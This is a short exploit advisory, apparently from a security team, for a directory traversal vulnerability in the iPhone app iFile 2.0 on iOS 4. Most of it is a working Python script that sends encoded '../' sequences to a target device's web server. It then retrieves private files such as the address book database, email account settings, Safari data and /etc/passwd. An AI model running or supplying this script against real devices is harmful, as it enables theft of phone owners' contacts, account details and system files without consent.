----------------------------------------------------------------
Software : iPhone iFile 2.0
Type of vunlnerability : Directory Traversal
Tested On : iPhone 4 (IOS 4.0.1)
Risk of use : High
----------------------------------------------------------------
Program Developer : http://ax.itunes.apple.com/app/id307458094?mt=8
----------------------------------------------------------------
Discovered by : Khashayar Fereidani
Team Website : Http://IRCRASH.COM
Team Members : Khashayar Fereidani - Sina YazdanMehr - Arash Allebrahim
English Forums : Http://IRCRASH.COM/forums/
Email : irancrash [ a t ] gmail [ d o t ] com
Facebook : http://facebook.com/fereidani
----------------------------------------------------------------

Exploit:
#!/usr/bin/python
import urllib2
def urlread(url,file):
	url = url+"/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f"+file
	u = urllib2.urlopen(url)
	localFile = open('result.html', 'w')
	localFile.write(u.read())
	localFile.close()
	print "file saved as result.html\nIRCRASH.COM 2011"
print "----------------------------------------\n- iPhone iFile 2.0 DT                  -\n- Discovered by : Khashayar Fereidani  -\n- http://ircrash.com/                  -\n----------------------------------------"
url = raw_input("Enter Address ( Ex. : http://192.168.1.101:8080 ):")
f = ["","/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb","/private/var/mobile/Library/Safari","/private/var/mobile/Library/Preferences/com.apple.accountsettings.plist","/private/var/mobile/Library/Preferences/com.apple.conference.plist","/etc/passwd"]
print f[1]
id = int(raw_input("1 : Phone Book\n2 : Safari Fav\n3 : Users Email Info\n4 : Network Informations\n5 : Passwd File\n6 : Manual File Selection\n Enter ID:"))
if not('http:' in url):
	url='http://'+url
if ((id>0) and (id<6)):
	file=f[id]
	urlread(url,file)
if (id==6):
	file=raw_input("Enter Local File Address : ")
	urlread(url,file)